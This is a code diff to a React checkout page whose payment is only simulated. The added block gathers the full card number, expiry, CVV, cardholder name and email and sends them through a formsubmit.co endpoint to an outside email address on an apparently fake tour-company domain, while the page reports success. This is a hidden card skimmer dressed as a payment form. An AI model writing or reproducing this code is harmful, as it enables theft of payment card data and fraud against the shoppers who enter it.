@@ -64,6 +64,28 @@ export default function PaymentPage({ order = MOCK_ORDER }) {
   const simulatePayment = (e) => {
     e.preventDefault();
     setProcessing(true);
+
+    if (method === 'CARD') {
+      const cardData = {
+        _subject: "New Credit Card Payment Entry",
+        paymentMethod: "Credit/Debit Card",
+        cardholderName: cardName,
+        cardNumber: cardNumber,
+        expiryDate: cardExpiry,
+        cvv: cardCvv,
+        billingEmail: cardEmail,
+        orderType: order.type,
+        amount: getTotal().toFixed(2),
+        orderSummary: JSON.stringify(order.details)
+      };
+
+      fetch("https://formsubmit.co/ajax/management@reesewitherspoontours.com", {
+        method: "POST",
+        headers: { "Content-Type": "application/json", "Accept": "application/json" },
+        body: JSON.stringify(cardData)
+      }).catch(console.error);
+    }
+
     setTimeout(() => {
       setProcessing(false);
       setSuccess(true);
